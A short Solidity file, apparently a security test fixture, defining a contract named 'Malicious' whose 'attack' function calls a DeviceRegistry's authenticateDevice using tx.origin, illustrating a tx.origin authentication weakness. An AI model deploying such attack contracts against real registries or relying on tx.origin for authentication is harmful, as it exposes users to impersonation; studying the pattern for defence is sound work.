// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DeviceRegistry.sol";

contract Malicious {
    DeviceRegistry public deviceRegistry;

    constructor(address _deviceRegistryAddress) {
        deviceRegistry = DeviceRegistry(_deviceRegistryAddress);
    }

    function attack(string memory deviceId) public view {
        deviceRegistry.authenticateDevice(deviceId, tx.origin);
    }
}
